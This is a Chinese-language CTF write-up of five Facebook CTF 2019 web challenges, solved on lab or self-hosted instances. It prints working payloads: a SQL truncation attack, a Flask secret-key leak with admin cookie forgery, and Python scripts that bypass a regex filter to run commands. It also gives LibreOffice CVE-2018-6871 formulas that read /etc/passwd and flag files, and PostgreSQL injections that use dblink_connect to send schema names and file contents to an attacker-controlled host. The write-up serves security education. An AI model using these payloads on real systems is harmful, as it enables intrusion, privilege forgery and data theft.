---
title: Facebook CTF2019wp
date: 2026-05-11T20:48:23+08:00
lastmod: 2026-05-11T20:48:23+08:00
summary: 远古老题
url: /posts/FacebookCTF2019wp/
categories:
  - 赛题wp
tags:
  - FBCTF2019
draft: false
---

# \[FBCTF2019\] Products Manager

## \#基于约束的SQL攻击

打开环境有`/add.php`添加产品，`/view.php`查看产品

## 代码分析

先看看源码，一共有六个文件

![](image/Pasted%20image%2020260512200445.png)

footer.php是空的，header.php就是环境主页的代码

index.php

```php
<?php

require_once("db.php");

$products = get_top_products();

require_once("header.php");
?>

<p>
  <ul>
<?php
foreach ($products as $product) {
  echo "<li>" . htmlentities($product['name']) . "</li>";
}
?>
  </ul>
</p>

<?php require_once("footer.php");
```

先require导入了一个db.php，里面先是执行了一些连接数据库的操作

```php
/*
CREATE TABLE products (
  name char(64),
  secret char(64),
  description varchar(250)
);

INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
*/
error_reporting(0);
require_once("config.php"); // DB config

$db = new mysqli($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DBNAME);

if ($db->connect_error) {
  die("Connection failed: " . $db->connect_error);
}
```

可以看到有一个products表，并执行了五条插入语句，其中facebook中就有FLAG

随后调用了get_top_products函数

```php
function get_top_products() {
  global $db;
  $statement = $db->prepare(
    "SELECT name FROM products LIMIT 5"
  );
  check_errors($statement);
  check_errors($statement->execute());
  $res = $statement->get_result();
  check_errors($res);
  $products = [];
  while ( ($product = $res->fetch_assoc()) !== null) {
    array_push($products, $product);
  }
  $statement->close();
  return $products;
}
```

其实就是获取前五条产品的内容，而后引入了header.php，最后for循环输出这五个产品的name

然后看看add和view的处理逻辑

首先是add.php

```php
<?php

require_once("db.php");
require_once("header.php");

function validate_secret($secret) {
  if (strlen($secret) < 10) {
    return false;
  }
  $has_lowercase = false;
  $has_uppercase = false;
  $has_number = false;
  foreach (str_split($secret) as $ch) {
    if (ctype_lower($ch)) {
      $has_lowercase = true;
    } else if (ctype_upper($ch)) {
      $has_uppercase = true;
    } else if (is_numeric($ch)) {
      $has_number = true;
    }
  }
  return $has_lowercase && $has_uppercase && $has_number;
}

function handle_post() {
  global $_POST;

  $name = $_POST["name"];
  $secret = $_POST["secret"];
  $description = $_POST["description"];

  if (isset($name) && $name !== ""
        && isset($secret) && $secret !== ""
        && isset($description) && $description !== "") {
    if (validate_secret($secret) === false) {
      return "Invalid secret, please check requirements";
    }

    $product = get_product($name);
    if ($product !== null) {
      return "Product name already exists, please enter again";
    }

    insert_product($name, hash('sha256', $secret), $description);

    echo "<p>Product has been added</p>";
  }

  return null;
}

$error = handle_post();
if ($error !== null) {
  echo "<p>Error: " . $error . "</p>";
}
?>
<form action="/add.php" method="POST">
  Name of your product: <input type="text" name="name" /><br />
  Secret (10+ characters, smallcase, uppercase, number) : <input type="password" name="secret" /><br />
  Description: <input type="text" name="description" /><br />
  <input type="submit" value="Add" />
</form>

<?php require_once("footer.php");
```

validate_secret函数是对secret密钥的一些检测，get_product函数用于获取对应产品，而insert_product函数就是插入产品

然后看看view.php

```php
<?php

require_once("db.php");
require_once("header.php");

function handle_post() {
  global $_POST;

  $name = $_POST["name"];
  $secret = $_POST["secret"];

  if (isset($name) && $name !== ""
        && isset($secret) && $secret !== "") {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return "Incorrect name or secret, please try again";
    }

    $product = get_product($name);

    echo "<p>Product details:";
    echo "<ul><li>" . htmlentities($product['name']) . "</li>";
    echo "<li>" . htmlentities($product['description']) . "</li></ul></p>";
  }

  return null;
}

$error = handle_post();
if ($error !== null) {
  echo "<p>Error: " . $error . "</p>";
}
?>
<form action="/view.php" method="POST">
  Name: <input type="text" name="name" /><br />
  Secret: <input type="password" name="secret" /><br />
  <input type="submit" value="View" />
</form>

<?php require_once("footer.php");

```

其实也就是正常的查找返回产品内容的操作

看似是没什么漏洞的，那入手点在哪呢？

## 攻击手法

https://cs-cshi.github.io/cybersecurity/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB/

基于约束的SQL攻击，其实只需要关注INSERT和SELECT两种语句的差异

文中是这样写的

在所有的 INSERT 查询中，SQL都会根据 varchar(n) 来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。

而select 语句对于参数后面空格的处理是删除，insert 只是截取最大长度的字符串，然后插入数据库。

攻击就是利用 select 与 insert 对长度和空格处理方式不同造成的漏洞。

在db.php中已经给出了字段的长度边界

```php
CREATE TABLE products (
  name char(64),
  secret char(64),
  description varchar(250)
);
```

name最长是64个字符

那我们尝试add添加产品，name为facebook+[最少56个空格]+若干个字符，其他的自己设置就行了

```http
name=facebook                                                        a&secret=aA11111111&description=111
```

然后view里面直接查询facebook就行了，因为select中会把空白字符去掉

![image-20260511212225294](image/image-20260511212225294.png)

# \[FBCTF2019\] Event

## \#SSTI+session伪造

注册登录后有一个添加事件的panel，管理员面板没法看，看看cookie

```http
events_sesh_cookie=.eJwlzrkRAjEMBdBeFG9g-ZC_aIaxDg-kuxAx9E7Aq-B96L7PvB50e53vPOj-DLqRIwO9B6IKmplIQLO1PapFsqdjqzQfLC107i1b11pg1ImpPHQUBQcEaN7Ts7uPMBtz9WUSha0L1uCMojLVd0FRrswmmpUOel95_jNM3x-68C7o.agHY1w.h7zdiLvZYsJG3KWvLDrzEXCUMwY
```

拿去解密了一下session

```bash
PS E:\脚本和字典> python .\flask下session解密脚本.py '.eJwlzrkRAjEMBdBeFG9g-ZC_aIaxDg-kuxAx9E7Aq-B96L7PvB50e53vPOj-DLqRIwO9B6IKmplIQLO1PapFsqdjqzQfLC107i1b11pg1ImpPHQUBQcEaN7Ts7uPMBtz9WUSha0L1uCMojLVd0FRrswmmpUOel95_jNM3x-68C7o.agHY1w.h7zdiLvZYsJG3KWvLDrzEXCUMwY'
{'_fresh': True, '_id': 'c8ed844d8d2683bb66d89e33f52bde1cec8f963c5163d97ff6f9aaa8182787915950981d86883c4ece4cc5dbb57a4ab6d01b468a51ed09679cf08091211b69e2', 'user_id': '1'}
```

但是key没有，然后测了一下name和address，没测出来ssti

后面发现注入点在event_important，传入`event_important=__dict__`会有回显

```json
{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7f2abca0d290>, 'address': '1', 'id': 10, 'owner_id': 1, 'name': '1', 'show': '__dict__', 'fmt': '{0.__dict__}'}
```

![image-20260511214050023](image/image-20260511214050023.png)

然后我们尝试读取key

```http
event_important=__class__.__init__.__globals__
```

![image-20260511214437433](image/image-20260511214437433.png)

```http
event_important=__class__.__init__.__globals__[app].config
```

传入后成功拿到SECRET_KEY

```tex
fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y
```

尝试伪造admin，但是好像user_id不是admin

试了两次，一个admin，一个id为1，id为1的正常显示但是admin的不行

![image-20260511215537007](image/image-20260511215537007.png)

估计这个cookie不是最终做鉴权的session，关注另一个cookie user

```html
user=IjEi.agHY1w.re4c1GokpLC_8NY89ifljvzgAgo
```

第一段解码后是1，这个看起来是一个**独立的 Flask 签名 cookie**，直接伪造后admin传入

```bash
C:\Users\23232>flask-unsign --sign --cookie "admin" --secret "fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y"
ImFkbWluIg.agHhWQ.aHeYW9jQy0soIlpugpY3PkyGt7U
```

![image-20260511220541044](image/image-20260511220541044.png)

所以这里是用了两种鉴权机制进行鉴权，events_sesh_cookie是flask原生的session，不过题目中是用的自定义的user做最终的鉴权

参考https://xz.aliyun.com/t/5399#toc-1的文章给出了一种方法

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route('/')
def index():
    print(session_serializer.dumps("admin"))

index()
```

![image-20260511220037110](image/image-20260511220037110.png)

# \[FBCTF2019\]RCEService

## \#PCRE回溯绕过/换行绕过preg

是一个Web管理界面，可以传入json格式的命令

```http
/?cmd={"cmd":"ls"}	//index.php
```

想看看源码，发现过滤了很多字符比如`.`，`/`等，后面才知道这道题是给了源码的

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

这道题挺狠，只给了小写字母，空格，双引号和花括号，目前还没找到合适的方法

## 回溯绕过

但是可以注意导preg_match的匹配规则中第一个就是`^.* `，贪婪匹配，想到p牛之前的PCRE绕过的文章，我自己也学过：https://wanth3f1ag.top/posts/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/#%E5%85%B3%E4%BA%8Epreg_match%E7%BB%95%E8%BF%87

并且这里需要注意一行代码`putenv('PATH=/home/rceservice/jail');`相当于设置了一个沙箱环境，只有在这个目录下的命令才能执行，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以可以用绝对路径去绕过 PATH 限制

注：Linux命令的位置：/bin和/usr/bin，默认都是全体用户使用，/sbin和/usr/sbin,默认root用户使用

给出exp

```python
import requests

url = "http://3af1aa82-2664-40dc-9d4e-ee20cfe1e1d3.node5.buuoj.cn:81/"

payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'

res = requests.post(url, data={"cmd": payload})
print(res.text)
```

注意，由于源码中是`$_REQUEST`，并且因为数据特别大，get传会导致接受内容过大导致过载，所以这里的话是需要post传的

不知道flag在哪的可以用find去找flag

```python
import requests

url = "http://3af1aa82-2664-40dc-9d4e-ee20cfe1e1d3.node5.buuoj.cn:81/"

payload = '{"cmd":"/usr/bin/find / -name flag* 2>/dev/null","test":"' + "a"*(1000000) + '"}'

res = requests.post(url, data={"cmd": payload})
print(res.url)
print(res.text)
```

![image-20260511224629812](image/image-20260511224629812.png)

第二个方法就是换行绕过preg

## 换行绕过

再看看正则匹配

```php
preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)
```

开头和结尾都有一个`.*`，但是`.`默认不会匹配换行符`\n`，

而且换行符 `\n` 处于 JSON 对象的花括号与键名之间，属于**合法空白字符**，`json_decode` 能正确解析。

```http
/?cmd={%0A"cmd":"/bin/cat /home/rceservice/flag"%0A} 
本质上是
{
	"cmd":"/bin/cat /home/rceservice/flag"
}
```

可能有些人会问，哎？为什么这里开头结尾都要一个换行符呢？其实是这样的

放个官方图

![image-20260511230652609](image/image-20260511230652609.png)

**从正则匹配的流程上说，首先是`^.*`开头的贪婪匹配，由于匹配不到换行符，所以`^.*`最终只匹配到了`{`，而中间的`(pattern)`关键字匹配是能匹配到换行符的，也就是在`\x00-\x1F`中，所以这段pattern匹配到换行符了；接下来关键的来了，末尾的`.*`也是贪婪匹配，所以从换行符后面到第二个换行符之间的符号他都能匹配掉，所以他匹配到了两个换行符之间的所有字符，而`$`元字符必须匹配到行尾，但此时并不是行尾而是一个换行符，所以最终preg_match匹配是失败的，返回0**

基于上面的解释，对于其他师傅的wp里的poc也就不难理解了

# \[FBCTF2019\] pdfme

## \#LibreOffice6.0 任意文件读取CVE-2018-6871

题目描述

```html
我们设立这个 PDF 转换服务是为了方便公众使用，希望它是安全的。
```

这个在buu没环境，只能从GitHub拉项目下来本地部署了

项目地址：[https://github.com/fbsamples/fbctf-2019-challenges]()

在pdfme文件夹下执行命令

```bash
docker build --tag=pdf .
docker run -p 80:80 pdf

或者直接构建启动
docker compose up --build
```

访问http://127.0.0.1:80/就出来了

```html
Choose a file to upload (.fods, max 64kb, lowercase name)
```

只能上传.fods后缀文件，并且上传后会转化成pdf

**FODS文件** 是 **Flat OpenDocument Spreadsheet** 的缩写，是 LibreOffice/OpenOffice 使用的一种电子表格格式。

先上传一个标准的fods文件上去看看

```xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  office:mimetype="application/vnd.oasis.opendocument.spreadsheet"
  office:version="1.3">
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
        <table:table-row>
          <table:table-cell office:value-type="string">
            <text:p>A</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
    </office:spreadsheet>
  </office:body>
</office:document>
```

意思很简单，就是一个包含一个单元格且内容为A的表格

但是我传上去一直报500，后面发现是docker镜像缺少一个libxinerama1库，进去安装一下

```bash
apt-get update && apt-get install -y \ libcups2 \ libxinerama1 \ libglu1-mesa \ libx11-6 \ libxext6 \ libxrender1 \ libxtst6 \ libxi6 \ libfontconfig1
```

传上去之后pods文件会转化成pdf文件

![](image/Pasted%20image%2020260512222344.png)

将pdf下载下来，利用exiftool查看文件信息

```bash
C:\Users\23232\Desktop\附件\脚本>exiftool 1.pdf
ExifTool Version Number         : 13.58
File Name                       : 1.pdf
Directory                       : .
File Size                       : 7.8 kB
File Modification Date/Time     : 2026:05:12 22:25:37+08:00
File Access Date/Time           : 2026:05:12 22:25:41+08:00
File Creation Date/Time         : 2026:05:12 22:25:41+08:00
File Permissions                : -rw-rw-rw-
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Media Box                       : 0, 0, 595, 841
Page Count                      : 1
Creator                         : Calc
Producer                        : LibreOffice 6.0
Create Date                     : 2026:05:12 14:22:24Z
```

可以看到使用的是 **LibreOffice 6.0**，那么就存在一个CVE-2018-6871

https://www.cvedetails.com/cve/CVE-2018-6871/

`LibreOffice 5.4.5 之前的版本和 6.x 6.0.1 之前的版本允许远程攻击者通过文档中的 =WEBSERVICE 调用读取任意文件，这些调用使用了 COM.MICROSOFT.WEBSERVICE 函数。`

那就改一下单元格内容

```xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  office:mimetype="application/vnd.oasis.opendocument.spreadsheet"
  office:version="1.3">
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
        <table:table-row>
          <table:table-cell table:formula="=COM.MICROSOFT.WEBSERVICE(&quot;file:///etc/passwd&quot;)">
          </table:table-cell>
        </table:table-row>
      </table:table>
    </office:spreadsheet>
  </office:body>
</office:document>
```

![](image/Pasted%20image%2020260512223714.png)

回显出当前用户的主目录为/home/libreoffice_admin，估计flag在根目录下，尝试读取flag

```xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  office:mimetype="application/vnd.oasis.opendocument.spreadsheet"
  office:version="1.3">
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
        <table:table-row>
          <table:table-cell table:formula="=COM.MICROSOFT.WEBSERVICE(&quot;file:///home/libreoffice_admin/flag&quot;)">
          </table:table-cell>
        </table:table-row>
      </table:table>
    </office:spreadsheet>
  </office:body>
</office:document>
```

![](image/Pasted%20image%2020260512223911.png)

成功拿到flag

# \[FBCTF2019\] hr_admin_module

## \#PostgreSQL注入

这个也是需要自己搭建环境的，不过环境也比较老了需要让ai修一下

```bash
docker compose up -d --build
```


![](image/Pasted%20image%2020260513140340.png)

![](image/Pasted%20image%2020260513140451.png)

提示无法显示文件 /var/lib/postgresql/data/secret，当前用户权限不够

但是从这个路径也可以看出后端数据库是postgresql

测了一下查找员工的功能，但是没啥回显，看看另一个被禁用的查找用户的功能

前端禁用其实就等于没禁用，改一下或者直接抓包改包就行了

![](image/Pasted%20image%2020260513141729.png)

传入单引号出现警告，加上注释警告就没了

![](image/Pasted%20image%2020260513141813.png)

那就是存在SQL注入的，是pgsql注入，测一下过滤

mad我发现我本地启动的环境很不稳定，有些payload测了两次是不同的

直接参考大佬的wp吧：

https://xz.aliyun.com/news/5030#toc-1

https://balsn.tw/ctf_writeup/20190603-facebookctf/#hr_admin_module

其实做法就是先打OOB带外注入或者盲注

## OOB带外注入

OOB带外注入需要我们自己搭建一个pgsql的服务，然后调用dblink_connect函数去建立远程会话

连接到我们搭建的pgsql服务，我们通过监听服务端口就可以查看请求包的信息

例如我们尝试建立连接

```sql
a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=postgres password= dbname=postgres')) --
```

此时在请求包上就会携带连接信息

爆数据库

```sql
a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
```

`||`在pgsql中是连接符的意思，这里其实就是将查询结果拼接到user里面，我们在请求包上就能看

到结果

## 时间盲注

根据wp里面所说，这里其实是有过滤的，不过可以用repeat()去进行延时，比如

```sql
'and 1=2 union select NULL, (select case when 1=1 then (select repeat('a', 10000000)) else NULL end)--
```

不过flag是在文件中，需要调用lo_import()函数将文件

加载到postgres 对象中

```sql
a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
```

此时会返回一个对象ID，最后读取整个对象ID就行了

```sql
a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=postgres')) --
```

最后还有一个xss的比较难，暂时还看不懂